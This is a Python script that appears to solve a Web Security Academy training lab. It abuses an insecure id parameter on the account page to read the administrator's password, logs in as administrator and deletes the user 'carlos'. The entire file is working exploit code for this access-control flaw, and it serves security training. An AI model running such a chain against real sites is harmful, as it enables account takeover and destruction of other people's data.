# usage:
# python3 5.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net \
# --w carlos

import re
from argparse import ArgumentParser

import requests


def solve(url: str, who: str) -> None:
    s = requests.Session()
    url = url.rstrip("/")
    login_url = f"{url}/login"
    admin_url = f"{url}/admin"
    account_url = f"{url}/my-account?id=administrator"

    r = s.get(login_url)
    csrf = re.findall(r"\"csrf\" value=\"([\w]+)\"", r.text)[0]
    r = s.post(
        login_url,
        data={
            "csrf": csrf,
            "username": "wiener",
            "password": "peter",
        },
    )

    r = s.get(account_url)
    password = re.findall(r"password value=\'([\w]+)\'", r.text)[0]

    s = requests.Session()

    r = s.get(login_url)
    csrf = re.findall(r"\"csrf\" value=\"([\w]+)\"", r.text)[0]
    r = s.post(
        login_url,
        data={
            "csrf": csrf,
            "username": "administrator",
            "password": password,
        },
    )

    r = s.get(admin_url + f"/delete?username={who}")


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    parser.add_argument("--w", "--who", dest="who")
    args = parser.parse_args()
    solve(args.url, args.who)


if __name__ == "__main__":
    main()
